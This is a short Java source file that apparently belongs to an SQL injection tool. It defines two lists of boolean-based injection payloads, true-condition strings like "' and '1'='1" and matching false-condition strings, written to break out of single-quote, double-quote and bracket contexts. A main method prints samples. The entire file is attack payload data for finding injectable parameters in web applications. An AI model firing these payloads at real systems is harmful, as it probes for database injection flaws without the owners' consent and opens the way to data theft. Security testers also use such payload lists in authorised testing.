package com.sql.sqlinjecttool.payload;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;


//
public class BooleanPayload {
    public static List booleanTurePayload = Arrays.asList(
            " and 1=1 ",
            ") and (1=1  ",
            "' and '1'='1 ",
            "') and ('1'='1",
            "\" and \"A\"=\"A",
            "\")and (\"1\"=\"1 "
    );
    public static List booleanFalesPayload = Arrays.asList(
            " and 1=2 ",
            ") and (1=2  ",
            "' and '1'='2 ",
            "') and ('1'='2",
            "\" and \"A\"=\"B",
            "\")and (\"1\"=\"2 "
    );


    public static void main(String[] args) {
        System.out.println(BooleanPayload.booleanFalesPayload.get(2));
        System.out.println(BooleanPayload.booleanTurePayload.get(1));
    }
}
